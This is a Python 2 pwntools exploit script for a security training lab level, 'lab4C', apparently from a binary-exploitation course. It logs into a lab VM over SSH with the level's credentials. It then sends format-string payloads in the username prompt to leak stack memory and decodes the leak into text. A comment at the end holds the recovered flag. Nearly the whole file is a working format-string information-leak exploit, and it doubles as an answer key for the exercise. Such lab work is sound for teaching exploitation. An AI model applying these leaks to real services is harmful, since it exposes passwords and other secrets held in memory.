#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template lab4C --user lab4C --pass lab04start --host 192.168.56.101 --path /levels/lab04/lab4C
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab4C')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '192.168.56.101'
port = int(args.PORT or 22)
user = args.USER or 'lab4C'
password = args.PASSWORD or 'lab04start'
remote_path = '/levels/lab04/lab4C'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

def leak_data(start_index, length):
    io = start()
    io.recvuntil("Username: ")

    crafted = ""
    for i in range(start_index, start_index + length):
        crafted += "%{}$08x".format(i)
    print (crafted)

    io.sendline(crafted)
    io.recvuntil("Password: ")
    io.sendline("ABCDEFGHIJKLMN")
    io.recvuntil('\n')
    data = io.clean()
    return data[:(length*8)]


data = ""
i = 1
while i < 50:
    data += leak_data(i, 1)
    i += 1

print (data)

def my_unpack(n):
    print (n)
    n = [n[i:i+2] for i in range(0, len(n), 2)]
    new_n = []

    i = len(n) - 1
    while i >= 0:
        new_n.append(n[i])
        i -= 1
    n = ''.join(new_n)

    print (n)
    return n

data = [my_unpack(data[i:i+8]) for i in range(0, len(data), 8)]
print (data)

s = ""
for x in data:
    print (x)
    s += (x).decode('hex')

s = s.replace('\x00', "")
for x in s:
    if ord(x) < 128 and ord(x) > 31:
        print x,
    else:
        print "?",

# flag bu7_1t_w4sn7_brUt3_f0rc34b1e!
